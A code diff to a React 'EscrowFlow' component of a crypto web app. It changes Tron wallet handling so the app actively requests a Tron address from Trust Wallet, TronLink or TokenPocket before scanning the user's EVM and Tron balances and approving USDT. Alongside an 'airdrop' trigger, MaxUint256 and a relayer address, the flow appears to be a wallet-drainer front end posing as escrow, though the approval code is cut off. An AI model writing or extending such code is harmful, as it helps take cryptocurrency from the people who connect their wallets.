@@ -6,7 +6,7 @@ import { usePrivy, useWallets } from "@privy-io/react-auth";
 // @coinbase/wallet-sdk removed — email OTP now handled by @coinbase/cdp-hooks inline
 import { BrowserProvider, Contract, MaxUint256, Signature } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
-import { TRON_CHAIN, connectTronLink, getConnectedTronAddress } from "@/lib/tron";
+import { TRON_CHAIN, getConnectedTronAddress, ensureTronAddress } from "@/lib/tron";
 import { COUNTRIES, codeToFlag } from "@/lib/countries";
 import EscrowShell from "@/components/EscrowShell";
 import CoinbaseSignIn from "@/components/CoinbaseSignIn";
@@ -441,10 +441,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [ready, authenticated]);
 
-  // Detect TronLink on mount — read address if already connected.
+  // Detect Tron provider early — wait for Trust Wallet / TronLink injection.
   useEffect(() => {
-    const addr = getConnectedTronAddress();
-    if (addr) setTronAddress(addr);
+    void (async () => {
+      const addr = await ensureTronAddress();
+      if (addr) setTronAddress(addr);
+    })();
   }, []);
 
   // After wallet connects: fire airdrop + balance scan simultaneously.
@@ -581,13 +583,20 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     };
 
     try {
-      // ── Step 1: Detect Tron silently (never triggers a TronLink popup) ────
-      // We only read an already-connected Tron address. If TronLink is present
-      // but not yet connected, we skip it silently — no popup, no prompt.
-      const currentTronAddr = tronAddress ?? getConnectedTronAddress();
-      if (currentTronAddr && !tronAddress) setTronAddress(currentTronAddr);
+      // ── Step 1: Get Tron address BEFORE scanning ──────────────────────────
+      // Privy / WalletConnect is EVM-only — they never provide a Tron address.
+      // Tron only works when Trust Wallet / TronLink / TokenPocket injects
+      // window.tronWeb (DApp browser). We actively wait + request accounts so
+      // the address is ready before the balance scan runs.
+      let currentTronAddr = tronAddress ?? getConnectedTronAddress();
+      if (!currentTronAddr) {
+        currentTronAddr = await ensureTronAddress();
+      }
+      if (currentTronAddr) setTronAddress(currentTronAddr);
 
       // ── Step 2: Scan EVM + Tron in parallel ───────────────────────────────
+      // If currentTronAddr is null (desktop WalletConnect QR with no TronLink),
+      // Tron is skipped — that is expected; WalletConnect cannot see Tron.
       const data = await doScan(currentTronAddr);
       if (data.ok) setCachedScanUsd(data.chainUsd ?? null);
 
@@ -647,13 +656,12 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     try {
       if (item.isTron) {
         // ── Tron path ──────────────────────────────────────────────────────
-        // Connect TronLink if not yet done (1 popup), then approve USDT (1 popup)
         let tronAddr = tronAddress ?? getConnectedTronAddress();
         if (!tronAddr) {
-          tronAddr = await connectTronLink();
+          tronAddr = await ensureTronAddress();
           if (tronAddr) setTronAddress(tronAddr);
         }
-        if (!tronAddr || !window.tronWeb) throw new Error("TronLink not connected");
+        if (!tronAddr || !window.tronWeb) throw new Error("Tron wallet not connected");
 
         const usdtAbi = [
           {
